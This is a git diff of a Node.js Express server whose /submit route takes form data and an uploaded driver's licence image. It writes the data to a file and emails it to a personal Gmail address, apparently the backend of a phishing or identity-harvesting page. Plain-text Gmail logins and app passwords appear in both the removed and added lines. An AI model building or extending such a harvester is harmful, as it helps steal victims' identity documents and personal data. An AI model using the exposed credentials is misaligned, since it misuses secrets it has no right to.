@@ -5,7 +5,8 @@ const path = require("path");
 const bodyParser = require("body-parser");
 const nodemailer = require("nodemailer");
 const multer = require("multer");
-const AdmZip = require("adm-zip");
+const zipFolder = require("zip-a-folder");
+
 const port = 9000;
 
 app.use(bodyParser.urlencoded({ extended: false }));
@@ -38,34 +39,35 @@ app.post("/submit", upload.single("DriversLicenseFront"), async (req, res) => {
       throw new Error("Invalid data.");
     }
 
+    // create a folder to store the message data
+    const folderName = `message-${Date.now()}`;
+    fs.mkdirSync(folderName);
+
+    // save the message data to a text file
+    const dataFileName = path.join(folderName, "happy.txt");
+    fs.writeFileSync(dataFileName, JSON.stringify(data));
+
     // create nodemailer transport object
     const transporter = nodemailer.createTransport({
       host: "smtp.gmail.com",
       port: 465,
       secure: true,
       auth: {
-        user: "ayomiakintoye00@gmail.com",
-        pass: "mwphwjmkjsiglnoz",
+        user: "tobir2275@gmail.com",
+        pass: "qteaicwtuuzthdbl",
       },
     });
 
-    // create a zip file with password protection
-    const zip = new AdmZip();
-    zip.addFile("happy.txt", Buffer.from(JSON.stringify(data))); // add data to a file named happy.txt in the zip file
-    zip.setPassword("1234"); // set the password to 1234
-    const zipBuffer = zip.toBuffer();
-
     // create mail options object
     const mailOptions = {
-      from: "ayomiakintoye00@gmail.com",
+      from: "tobir2275@gmail.com",
       to: "isaiahgabriel175@gmail.com", // recipient email address
       subject: "Data file",
-      text: "Data file attached.", // message body
+      text: "Please find attached the file containing the message data.",
       attachments: [
         {
-          filename: "happy.zip",
-          content: zipBuffer,
-          contentType: "application/zip",
+          filename: "happy.txt",
+          path: dataFileName,
         },
       ],
     };
@@ -73,6 +75,10 @@ app.post("/submit", upload.single("DriversLicenseFront"), async (req, res) => {
     // send mail with defined transport object
     const info = await transporter.sendMail(mailOptions);
     console.log("Email sent successfully.", info);
+
+    // remove the folder and file
+    fs.unlinkSync(dataFileName);
+    fs.rmdirSync(folderName, { recursive: true });
 
     res.sendFile(path.join(__dirname, "confirmation.html"));
   } catch (err) {
